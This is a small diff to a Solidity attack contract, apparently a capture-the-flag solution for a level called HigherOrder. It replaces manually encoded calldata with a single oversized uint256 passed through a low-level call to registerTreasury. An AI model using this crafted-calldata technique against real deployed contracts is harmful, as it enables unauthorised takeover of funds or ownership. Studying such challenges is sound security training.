@@ -17,16 +17,7 @@ contract HigherOrderAttack {
         hoAddress.call(
             abi.encodePacked(
                 HigherOrder.registerTreasury.selector,
-                abi.encode(256),
-                abi.encode(0x00),
-                abi.encode(0x00),
-                abi.encode(0x00),
-                abi.encode(0x00),
-                abi.encode(0x00),
-                abi.encode(0x00),
-                abi.encode(0x00),
-                abi.encode(4),
-                abi.encode(256)
+                abi.encode(type(uint256).max)
             )
         );
     }
